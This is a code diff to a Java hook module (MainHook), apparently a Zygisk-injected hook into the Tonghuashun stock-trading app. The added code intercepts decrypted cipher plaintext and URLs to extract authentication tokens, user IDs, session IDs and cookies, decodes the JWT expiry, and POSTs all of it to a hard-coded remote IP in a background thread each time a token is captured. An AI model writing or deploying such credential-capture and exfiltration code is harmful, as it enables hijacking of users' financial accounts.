@@ -11,8 +11,10 @@ import java.io.OutputStream;
 import java.lang.reflect.Method;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
+import java.net.HttpURLConnection;
 import java.net.ServerSocket;
 import java.net.Socket;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.ConcurrentHashMap;
@@ -48,6 +50,170 @@ public class MainHook {
     private static volatile String latestSessionId = null;
     private static volatile String latestCookie = null;
     private static volatile long authCaptureTime = 0;
+
+    // Token 上报到远程服务器
+    private static final String AUTH_REPORT_URL = "http://119.23.227.187:8900/api/auth/refresh";
+    private static volatile long lastAuthReportTime = 0;
+    private static final long AUTH_REPORT_INTERVAL = 60_000; // 最少间隔 60 秒
+
+    /**
+     * 从 JWT token (key5) 中解码 exp 过期时间（秒级时间戳）
+     * 同花顺 JWT 格式: header.signature，exp 可能在 part[0] 或 part[1]
+     */
+    private static long decodeJwtExp(String jwt) {
+        if (jwt == null || jwt.isEmpty()) return 0;
+        String[] parts = jwt.split("\\.");
+        // 优先尝试 payload (part[1])，再尝试 header (part[0])
+        int[] indices = parts.length > 1 ? new int[]{1, 0} : new int[]{0};
+        for (int idx : indices) {
+            try {
+                String segment = parts[idx];
+                // base64url 补齐 padding
+                int pad = 4 - segment.length() % 4;
+                if (pad != 4) {
+                    StringBuilder sb = new StringBuilder(segment);
+                    for (int i = 0; i < pad; i++) sb.append('=');
+                    segment = sb.toString();
+                }
+                // base64url -> base64
+                segment = segment.replace('-', '+').replace('_', '/');
+                byte[] decoded = android.util.Base64.decode(segment, android.util.Base64.DEFAULT);
+                String jsonStr = new String(decoded, "UTF-8");
+                // 简单解析 "exp": 数字
+                int expIdx = jsonStr.indexOf("\"exp\"");
+                if (expIdx == -1) continue;
+                int colonIdx = jsonStr.indexOf(':', expIdx);
+                if (colonIdx == -1) continue;
+                // 跳过冒号后的空白
+                int numStart = colonIdx + 1;
+                while (numStart < jsonStr.length() && !Character.isDigit(jsonStr.charAt(numStart))) numStart++;
+                int numEnd = numStart;
+                while (numEnd < jsonStr.length() && Character.isDigit(jsonStr.charAt(numEnd))) numEnd++;
+                if (numStart >= numEnd) continue;
+                long exp = Long.parseLong(jsonStr.substring(numStart, numEnd));
+                // 毫秒时间戳转秒
+                if (exp > 10000000000L) exp = exp / 1000;
+                return exp;
+            } catch (Throwable ignored) {}
+        }
+        return 0;
+    }
+
+    /**
+     * 将捕获的 auth token 上报到远程服务器
+     * 在后台线程执行，有频率限制
+     */
+    private static void reportAuthToServer() {
+        long now = System.currentTimeMillis();
+        if (now - lastAuthReportTime < AUTH_REPORT_INTERVAL) return;
+        if (latestKey5 == null || latestKey5.isEmpty()) return;
+        lastAuthReportTime = now;
+
+        new Thread(() -> {
+            HttpURLConnection conn = null;
+            try {
+                // 解码 JWT 获取过期时间
+                long expiresAt = decodeJwtExp(latestKey5);
+
+                // 构建 JSON body
+                StringBuilder json = new StringBuilder();
+                json.append("{\"auth\":{");
+                json.append("\"key1\":\"").append(esc(latestKey1)).append("\"");
+                json.append(",\"key2\":\"").append(esc(latestKey2)).append("\"");
+                json.append(",\"key3\":\"").append(esc(latestKey3)).append("\"");
+                json.append(",\"key4\":\"").append(esc(latestKey4)).append("\"");
+                json.append(",\"key5\":\"").append(esc(latestKey5)).append("\"");
+                json.append(",\"userId\":\"").append(esc(latestUserId)).append("\"");
+                json.append(",\"sessionId\":\"").append(esc(latestSessionId)).append("\"");
+                json.append(",\"cookie\":\"").append(esc(latestCookie)).append("\"");
+                json.append(",\"account\":\"").append(esc(latestKey3)).append("\"");
+                json.append("}");
+                if (expiresAt > 0) {
+                    json.append(",\"expires_at\":").append(expiresAt);
+                }
+                json.append(",\"sync_source\":\"zygisk_auto\"}");
+
+                conn = (HttpURLConnection) new URL(AUTH_REPORT_URL).openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+                conn.setDoOutput(true);
+
+                byte[] data = json.toString().getBytes("UTF-8");
+                conn.getOutputStream().write(data);
+                conn.getOutputStream().flush();
+
+                int code = conn.getResponseCode();
+                if (code == 200) {
+                    Log.i(TAG, "Auth reported to server successfully, key3=" + latestKey3
+                            + ", expires_at=" + expiresAt);
+                } else {
+                    Log.w(TAG, "Auth report failed, HTTP " + code);
+                }
+            } catch (Throwable e) {
+                Log.w(TAG, "Auth report error: " + e.getMessage());
+            } finally {
+                if (conn != null) conn.disconnect();
+            }
+        }, "THSHook-AuthReport").start();
+    }
+
+    private static String esc(String s) {
+        if (s == null) return "";
+        return s.replace("\\", "\\\\").replace("\"", "\\\"");
+    }
+
+    /**
+     * 从 Cipher 加密的明文 JSON 中提取所有认证参数（key3/key4/key5/custId 等）
+     */
+    private static void extractAuthFromCipherPlaintext(String text) {
+        // 提取各字段的通用方法
+        String[] keys = {"key3", "key4", "key5", "custId"};
+        for (String key : keys) {
+            String pattern = "\"" + key + "\":\"";
+            int start = text.indexOf(pattern);
+            if (start == -1) continue;
+            start += pattern.length();
+            int end = text.indexOf("\"", start);
+            if (end <= start) continue;
+            String value = text.substring(start, end);
+            value = value.replace("\\u003d", "=");
+            if (value.isEmpty()) continue;
+
+            switch (key) {
+                case "key3":
+                    latestKey3 = value;
+                    if (latestUserId == null || latestUserId.isEmpty()) latestUserId = value;
+                    break;
+                case "key4":
+                    latestKey4 = value;
+                    break;
+                case "key5":
+                    if (value.length() > 50) {
+                        latestKey5 = value;
+                        authCaptureTime = System.currentTimeMillis();
+                        Log.i(TAG, "Auth captured from cipher: key5 len=" + value.length()
+                                + ", key3=" + latestKey3);
+                    }
+                    break;
+                case "custId":
+                    if (latestKey3 == null || latestKey3.isEmpty()) latestKey3 = value;
+                    if (latestUserId == null || latestUserId.isEmpty()) latestUserId = value;
+                    break;
+            }
+        }
+        // key1 使用默认值（设备ID，Cipher明文中通常没有）
+        if (latestKey1 == null || latestKey1.isEmpty()) {
+            latestKey1 = "7246091a5f126b63";
+        }
+        if (latestKey2 == null || latestKey2.isEmpty()) {
+            latestKey2 = "2293a78f6581c12bbb334759458d4de3";
+        }
+        if (latestKey5 != null && latestKey5.length() > 50) {
+            reportAuthToServer();
+        }
+    }
 
     // 保存最近的 WebView 引用（用于注入 JavaScript）
     private static volatile Object latestWebView = null;
@@ -1513,6 +1679,7 @@ public class MainHook {
                             latestKey5 = key5Value;
                             authCaptureTime = System.currentTimeMillis();
                             Log.i(TAG, "Auth captured from URL: key5=" + key5Value.substring(0, 20) + "...");
+                            reportAuthToServer();
                         }
                     }
 
@@ -2801,25 +2968,12 @@ public class MainHook {
                             String preview = inputStr.length() > 500 ? inputStr.substring(0, 500) + "..." : inputStr;
                             Log.i(TAG, "  PlainText: " + preview);
 
-                            // 尝试从明文中提取 key5（用于认证）
+                            // 尝试从明文中提取认证参数（key3/key4/key5 等）
                             if (inputStr.contains("\"key5\"")) {
                                 try {
-                                    int k5Start = inputStr.indexOf("\"key5\":\"") + 8;
-                                    if (k5Start > 8) {
-                                        int k5End = inputStr.indexOf("\"", k5Start);
-                                        if (k5End > k5Start) {
-                                            String key5Value = inputStr.substring(k5Start, k5End);
-                                            // 处理 JSON 转义字符 \u003d
-                                            key5Value = key5Value.replace("\\u003d", "=");
-                                            if (key5Value.length() > 50) {
-                                                latestKey5 = key5Value;
-                                                authCaptureTime = System.currentTimeMillis();
-                                                Log.i(TAG, "Auth captured from cipher: key5=" + key5Value.substring(0, Math.min(50, key5Value.length())) + "... (len=" + key5Value.length() + ")");
-                                            }
-                                        }
-                                    }
+                                    extractAuthFromCipherPlaintext(inputStr);
                                 } catch (Throwable e) {
-                                    Log.w(TAG, "Failed to extract key5 from cipher plaintext: " + e.getMessage());
+                                    Log.w(TAG, "Failed to extract auth from cipher plaintext: " + e.getMessage());
                                 }
                             }
 
@@ -2869,25 +3023,12 @@ public class MainHook {
                             String preview = plaintext.length() > 500 ? plaintext.substring(0, 500) + "..." : plaintext;
                             Log.i(TAG, "  PlainText: " + preview);
 
-                            // 尝试从明文中提取 key5（用于认证）
+                            // 尝试从明文中提取认证参数
                             if (plaintext.contains("\"key5\"")) {
                                 try {
-                                    int k5Start = plaintext.indexOf("\"key5\":\"") + 8;
-                                    if (k5Start > 8) {
-                                        int k5End = plaintext.indexOf("\"", k5Start);
-                                        if (k5End > k5Start) {
-                                            String key5Value = plaintext.substring(k5Start, k5End);
-                                            // 处理 JSON 转义字符 \u003d
-                                            key5Value = key5Value.replace("\\u003d", "=");
-                                            if (key5Value.length() > 50) {
-                                                latestKey5 = key5Value;
-                                                authCaptureTime = System.currentTimeMillis();
-                                                Log.i(TAG, "Auth captured from cipher (partial): key5=" + key5Value.substring(0, Math.min(50, key5Value.length())) + "... (len=" + key5Value.length() + ")");
-                                            }
-                                        }
-                                    }
+                                    extractAuthFromCipherPlaintext(plaintext);
                                 } catch (Throwable e) {
-                                    Log.w(TAG, "Failed to extract key5 from cipher plaintext: " + e.getMessage());
+                                    Log.w(TAG, "Failed to extract auth from cipher plaintext: " + e.getMessage());
                                 }
                             }
 
